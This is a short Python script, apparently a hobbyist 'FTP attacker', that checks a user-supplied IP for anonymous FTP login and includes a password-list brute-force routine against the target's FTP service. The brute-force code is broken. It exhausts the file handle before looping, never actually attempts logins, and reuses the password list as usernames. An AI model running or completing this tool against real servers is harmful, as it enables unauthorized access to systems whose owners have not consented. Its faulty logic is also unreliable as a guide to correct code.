# Implementing FTP attacker
import ftplib

# ANSI codes for font colors
class colors:
    GREEN = '\033[92m'  # GREEN COLOR
    YELLOW = '\033[93m' # YELLOW COLOR
    RED = '\033[91m'    # RED COLOR
    RESET = '\033[0m'   # RESET COLOR

def anonLogin(IP):
    ftp = ftplib.FTP(IP)
    try:
        ftp.login('anonymous','')
        print(f"[{colors.GREEN}+{colors.RESET}] Anonymous login found on {IP}!\n")
        ftp.quit()
    except Exception as e:
        print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")

def ftpBruteForce(IP):
    ftp = ftplib.FTP(IP)
    try:
        f1 = open('10-million-password-list-top-100000.txt', 'r')
        usernames = f1.read()
        usernames = usernames.split('\n')
#        print(usernames)

        #f2 = open('10-million-password-list-top-100000.txt', 'r')
        i = 0
        while(i != len(usernames)):
            #username = username.strip('\n')
            username = usernames[i]
            for password in f1.readlines():
                password = password.strip('\n')
                print(f"{username}:{password}")
            i+=1
    except Exception as e:
        print(f"Error: {e}")

target = input("Enter the IP address of the target: ")
#anonLogin(target)
ftpBruteForce(target)